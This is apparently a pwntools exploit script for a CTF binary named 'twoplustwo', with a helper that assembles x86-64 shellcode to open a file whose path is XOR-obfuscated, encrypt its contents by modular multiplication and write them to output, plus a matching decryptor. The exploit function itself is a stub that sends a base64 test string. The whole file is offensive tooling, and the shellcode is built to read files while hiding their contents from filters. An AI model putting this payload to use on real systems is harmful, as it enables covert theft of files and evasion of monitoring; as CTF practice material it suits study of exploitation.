#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
import time, string, gmpy2
context.log_level="debug"
pwn_file="./twoplustwo"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
timeout=30
PORT=1234

def get_cc(ip=None):
    if ip == None:
        r=process(pwn_file)
    else:
        r=remote(ip,PORT)
    return r

def debug():
    #log.debug("libc address:0x%x"%libc.address)
    pause()

class random_str:
    def __mul__(self,length):
        if length%8 == 0:
            ret="".join([p64(randint(0x7f56ecd12000,0x7f56ecd52000)) for _ in range(length/8)])
        elif length%4 == 0:
            ret="".join([p32(randint(0x400000,0x604000)) for _ in range(length/4)])
        else:
            ret="".join([chr(randint(0,0xff)) for _ in range(length)])
        ret=ret.replace("\n","\x01")
        return ret

A=random_str()

def gen_sc_read_flag(key):
    src = r'''.intel_syntax noprefix
.code64

modulus = 0xFFFFFFFFFFFFFFC5
file_name_key = 0
file_name_len = 0
key = 0
out_fd = 1

.global _start
_start:
sub rsp,0x400
lea rdi, [rip + offset filename]

xor ecx,ecx
mov rax,file_name_key
dec_file_name:
xor [rdi+rcx], rax
add ecx,8
cmp ecx,file_name_len
jb dec_file_name

xor	esi,esi
push 2
pop	rax
cdq
syscall
test eax,eax
js out

push rax
pop rbx
push rsp
pop	rsi

read_loop:
push rbx
pop	rdi
mov	edx,0x400
xor	eax,eax
syscall
test eax,eax
jle out

push rax
pop rdi

mov rbp,modulus
xor ecx,ecx
enc_file:
mov rax,key
mul qword ptr [rsi+rcx]
div rbp
mov qword ptr [rsi+rcx], rdx
add ecx,8
cmp rcx,rdi
jb enc_file

push rcx
pop rdx
push 1
pop	rax
push out_fd
pop	rdi
syscall
test eax,eax
js out
jmp read_loop

out:
push 60
pop	rax
syscall

filename:
.ascii "put_your_flag_path_here\0"
'''
    start = src.find('.global _start')

    fnp1 = src.find('.ascii "') + len('.ascii "')
    fnp2 = src.find('"', fnp1) 
    fn = eval('"%s"' % src[fnp1:fnp2])
    fk = getrandbits(64)

    enc_fn = ''
    for i in xrange(0, len(fn), 8):
        block = fn[i:i+8]
        enc_fn += p64(u64(block.ljust(8, '\0')) ^ fk)[:len(block)]
    hex_fn = ''.join(map(lambda x:'\\x%02x' % ord(x), enc_fn))
    new_src = src[:start] 
    new_src += 'file_name_key = %d\nfile_name_len = %d\nkey = %d\n' % (fk, len(fn), key)
    new_src += src[start:fnp1] + hex_fn + src[fnp2:]
    sc = asm(new_src)
    return sc

def dec_flag(ct, key):
    flag = ''
    modulus = 0xFFFFFFFFFFFFFFC5
    key = gmpy2.invert(key, modulus)
    for i in xrange(0, len(ct), 8):
        block = u64(ct[i:i+8]) * key % modulus
        flag += p64(block)
    flag = flag[:flag.find('\n')]
    return flag

def call_func(idx,argv,name):
    data= str(idx)+"\x00"+"\x00".join(map(str,argv))+"\x00"+name
    return data.encode("base64")[:-1]

def exploit(ip):
    r=get_cc()
    payload=call_func("3",[1,2,3],"hz")
    pause()
    r.sendlineafter("[yourname])\n","1\x00hello\x00123\x00hz".encode("base64"))
    r.interactive()

if __name__ == "__main__":
    host="127.0.0.1"
    print exploit(host)




